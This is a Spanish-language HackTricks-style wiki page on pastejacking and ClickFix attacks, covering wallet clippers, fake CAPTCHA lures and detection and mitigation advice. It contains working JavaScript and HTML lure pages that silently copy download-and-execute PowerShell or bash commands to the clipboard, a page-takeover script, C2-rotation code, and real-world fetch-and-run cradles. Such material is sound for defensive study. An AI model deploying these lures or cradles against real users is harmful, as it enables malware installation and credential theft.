# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca pegues nada que no hayas copiado tú mismo." – consejo antiguo pero aún válido

## Overview

Clipboard hijacking – también conocido como *pastejacking* – aprovecha el hecho de que los usuarios copian y pegan comandos de forma rutinaria sin inspeccionarlos. Una página web maliciosa (o cualquier contexto capaz de ejecutar JavaScript, como una aplicación Electron o de escritorio) coloca programáticamente texto controlado por el atacante en el clipboard del sistema. Se anima a las víctimas, normalmente mediante instrucciones de social engineering cuidadosamente elaboradas, a pulsar **Win + R** (cuadro de diálogo Run), **Win + X** (Quick Access / PowerShell), o abrir un terminal y *pegar* el contenido del clipboard, ejecutando inmediatamente comandos arbitrarios.

Como **no se descarga ningún archivo ni se abre ningún attachment**, la técnica evita la mayoría de los controles de seguridad de e-mail y contenido web que supervisan attachments, macros o la ejecución directa de comandos. Por ello, el ataque es popular en campañas de phishing que distribuyen familias de malware commodity como NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Wallet-address replacement clippers

Otra variante de **clipboard hijacking** no pega comandos en absoluto: espera a que la víctima copie una **cryptocurrency wallet address**, y entonces la sustituye silenciosamente por una controlada por el atacante justo antes del pegado. Esto es especialmente eficaz contra formatos largos de wallet porque los usuarios a menudo solo verifican los primeros y últimos caracteres.

Rasgos comunes en el mundo real:
- **Thin loader + nested payload**: la app/exe visible parece una herramienta legítima de trading o de "profit", mientras que el verdadero clipper está oculto más profundamente en el bundle (por ejemplo, un loader .NET que lanza un payload Rust anidado).
- **Regex-driven replacement**: el malware coincide con cadenas como `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, o incluso cadenas genéricas de **44 caracteres tipo Solana** y las reescribe con wallets del atacante.
- **Wallet rotation at scale**: las muestras modernas de Windows pueden incorporar **miles** de wallets de reemplazo por moneda en lugar de una sola dirección estática, reduciendo la reputación de la wallet después de cada robo.

### Windows clipper flow

Una implementación común es una ventana oculta registrada con **`AddClipboardFormatListener`**. En cada actualización del clipboard, el malware normalmente llama a:
- **`OpenClipboard`** → acceder a los datos actuales del clipboard.
- **`GetClipboardData`** → leer el texto.
- **`EmptyClipboard`** + **`SetClipboardData`** → reemplazar la cadena de la wallet por el valor del atacante.

Minimal hunting regexes frecuentemente seen in clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
La persistencia a nivel de usuario es suficiente para el impacto. Un patrón observado es:
- Copiar el payload a **`%APPDATA%\silke\silke.exe`**
- Crear un **LNK** de la carpeta **Startup** bajo `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideas de detección:
- Procesos que llaman a las APIs del clipboard continuamente mientras también escriben en `%APPDATA%` y en la carpeta **Startup** del usuario.
- Nueva creación de **LNK**/ejecutable seguida de reescrituras del clipboard de la dirección de la wallet.
- Archivos comprimidos o paquetes de falso software que contienen muchos archivos sin usar más un pequeño launcher que inicia un binario anidado.

### Eliminación de quarantine mediante ingeniería social en macOS + persistencia LaunchAgent

En macOS, algunas campañas distribuyen un helper **`unlocker.command`** e indican a la víctima que haga clic derecho → **Open** si Gatekeeper dice que la app está dañada o es de un desarrollador no identificado. El script simplemente elimina quarantine y запуска la `.app` cercana:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Esto **no** es un exploit de Gatekeeper; es un **bypass de cuarentena mediante ingeniería social** que abusa del hecho de que las decisiones de Gatekeeper dependen del xattr `com.apple.quarantine`.

Tras la ejecución, el clipper puede persistir como el usuario actual escribiendo:
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent con `RunAtLoad` y `KeepAlive`

Un detalle defensivo útil es que algunas muestras implementan un **watchdog de autocuración** que reescribe el LaunchAgent y el wrapper cada ~30 segundos. Si eliminas primero el plist **sin matar el proceso en ejecución**, el malware puede recrearlo al instante. Orden seguro de limpieza:
1. Mata el proceso activo del clipper.
2. Descarga/elimina el plist del LaunchAgent.
3. Elimina `~/launch.sh` y el payload copiado.

### Nota de entrega: reputación falsa como multiplicador de fuerza

Para esta familia, el malware en sí puede seguir siendo técnicamente simple mientras la **capa de distribución** hace el trabajo pesado: estrellas/forks falsos en GitHub, reseñas/descargas en SourceForge, comentarios/vistas de tutoriales en YouTube y comentarios/votos benignos en VirusTotal se usan para que el binario parezca confiable antes de ejecutarse.

## Botones de copia forzada y payloads ocultos (one-liners de macOS)

Algunos infostealers de macOS clonan sitios de instaladores (por ejemplo, Homebrew) y **fuerzan el uso de un botón “Copy”** para que los usuarios no puedan resaltar solo el texto visible. La entrada del clipboard contiene el comando de instalación esperado más un payload Base64 añadido (por ejemplo, `...; echo <b64> | base64 -d | sh`), de modo que un solo pegado ejecuta ambos mientras la UI oculta la etapa extra.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Las campañas anteriores usaban `document.execCommand('copy')`, las más nuevas dependen de la **Clipboard API** asíncrona (`navigator.clipboard.writeText`).

## El flujo de ClickFix / ClearFake

1. El usuario visita un sitio typosquatted o comprometido (p. ej. `docusign.sa[.]com`)
2. El JavaScript inyectado de **ClearFake** llama a un helper `unsecuredCopyToClipboard()` que almacena silenciosamente en el clipboard una one-liner de PowerShell codificada en Base64.
3. Las instrucciones HTML le dicen a la víctima: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` se ejecuta, descargando un archive que contiene un ejecutable legítimo más una DLL maliciosa (classic DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistence (p. ej. scheduled task) – ejecutando finalmente NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legítimo) busca en su directorio `msvcp140.dll`.
* La DLL maliciosa resuelve dinámicamente las APIs con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) mediante **curl.exe**, los descifra usando una clave XOR rotatoria `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el descargador JScript dentro de **cscript.exe**
3. Obtiene un payload MSI → deja caer `libcef.dll` junto a una aplicación firmada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer vía MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada de **mshta** inicia un script oculto de PowerShell que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y concatenación de archivos y, finalmente, ejecuta un script `.a3x` que exfiltra credenciales del navegador a `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Algunas campañas de ClickFix omiten por completo las descargas de archivos e instruyen a las víctimas a pegar una línea que obtiene y ejecuta JavaScript mediante WSH, lo persiste y rota el C2 diariamente. Cadena de ejemplo observada:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Rasgos clave
- URL ofuscada invertida en tiempo de ejecución para evitar una inspección casual.
- JavaScript se mantiene a sí mismo mediante un Startup LNK (WScript/CScript), y selecciona el C2 según el día actual, lo que permite una rotación rápida de dominios.

Fragmento mínimo de JS usado para rotar C2s por fecha:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La siguiente etapa suele desplegar un loader que establece persistencia y descarga un RAT (p. ej., PureHVNC), a menudo fijando TLS a un certificado codificado y troceando el tráfico.

Ideas de detección específicas para esta variante
- Árbol de procesos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Artefactos de inicio: LNK en `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invocando WScript/CScript con una ruta JS bajo `%TEMP%`/`%APPDATA%`.
- Telemetría de Registry/RunMRU y de línea de comandos que contenga `.split('').reverse().join('')` o `eval(a.responseText)`.
- Repetidos `powershell -NoProfile -NonInteractive -Command -` con cargas útiles grandes por stdin para alimentar scripts largos sin líneas de comando largas.
- Scheduled Tasks que posteriormente ejecutan LOLBins como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` bajo una tarea/ruta con apariencia de updater (p. ej., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostnames y URLs de C2 con rotación diaria y patrón `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacionar eventos de escritura al clipboard seguidos por pegado con Win+R y luego ejecución inmediata de `powershell.exe`.


Los Blue-teams pueden combinar telemetría de clipboard, creación de procesos y registry para detectar abuso de pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantiene un historial de comandos de **Win + R** – busca entradas inusuales de Base64 / ofuscadas.
* Security Event ID **4688** (Process Creation) donde `ParentImage` == `explorer.exe` y `NewProcessName` en { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para creaciones de archivos bajo `%LocalAppData%\Microsoft\Windows\WinX\` o carpetas temporales justo antes del evento sospechoso 4688.
* Sensores de clipboard de EDR (si existen) – correlaciona `Clipboard Write` seguido inmediatamente de un nuevo proceso de PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campañas recientes producen en masa páginas falsas de verificación de CDN/browser ("Just a moment…", estilo IUAM) que coaccionan a los usuarios a copiar comandos específicos de su OS desde el clipboard hacia consolas nativas. Esto desvía la ejecución fuera del sandbox del navegador y funciona en Windows y macOS.

Rasgos clave de las páginas generadas por el builder
- Detección de OS mediante `navigator.userAgent` para adaptar payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops opcionales para OS no compatibles para mantener la ilusión.
- Copia automática al clipboard mediante acciones benignas de UI (checkbox/Copy) mientras el texto visible puede diferir del contenido del clipboard.
- Bloqueo móvil y un popover con instrucciones paso a paso: Windows → Win+R→paste→Enter; macOS → abrir Terminal→paste→Enter.
- Ofuscación opcional e injector de archivo único para sobrescribir el DOM de un sitio comprometido con una UI de verificación con estilo Tailwind (no requiere registrar un nuevo dominio).

Ejemplo: discrepancia de clipboard + branching consciente del OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistencia de macOS de la ejecución inicial
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que la ejecución continúe después de cerrar la terminal, reduciendo artefactos visibles.

Toma de control de la página en el lugar en sitios comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideas de detección y hunting específicas para señuelos estilo IUAM
- Web: páginas que vinculan la Clipboard API a widgets de verificación; desajuste entre el texto mostrado y la carga útil del portapapeles; ramificación con `navigator.userAgent`; Tailwind + reemplazo de una sola página en contextos sospechosos.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco después de una interacción con el navegador; instaladores batch/MSI ejecutados desde `%TEMP%`.
- Endpoint macOS: Terminal/iTerm iniciando `bash`/`curl`/`base64 -d` con `nohup` cerca de eventos del navegador; trabajos en segundo plano que sobreviven al cierre del terminal.
- Correlaciona el historial `RunMRU` de Win+R y las escrituras del portapapeles con la posterior creación de procesos de consola.

Ver también técnicas de apoyo

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake sigue comprometiendo sitios WordPress e inyectando JavaScript cargador que encadena hosts externos (Cloudflare Workers, GitHub/jsDelivr) e incluso llamadas blockchain “etherhiding” (por ejemplo, POST a endpoints de la API de Binance Smart Chain como `bsc-testnet.drpc[.]org`) para obtener la lógica actual del señuelo. Las superposiciones recientes usan intensamente fake CAPTCHAs que indican a los usuarios copiar/pegar una línea única (T1204.004) en lugar de descargar algo.
- La ejecución inicial se delega cada vez más en hosts de scripts firmados/LOLBAS. En enero de 2026, las cadenas cambiaron el uso anterior de `mshta` por el `SyncAppvPublishingServer.vbs` integrado ejecutado mediante `WScript.exe`, pasando argumentos tipo PowerShell con alias/comodines para obtener contenido remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` está firmado y normalmente se usa con App-V; combinado con `WScript.exe` y argumentos inusuales (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) se convierte en una etapa LOLBAS de alta señal para ClearFake.
- En febrero de 2026, los payloads falsos de CAPTCHA volvieron a cradles de descarga de PowerShell puro. Dos ejemplos en vivo:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- First chain is an in-memory `iex(irm ...)` grabber; the second stages via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden window.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
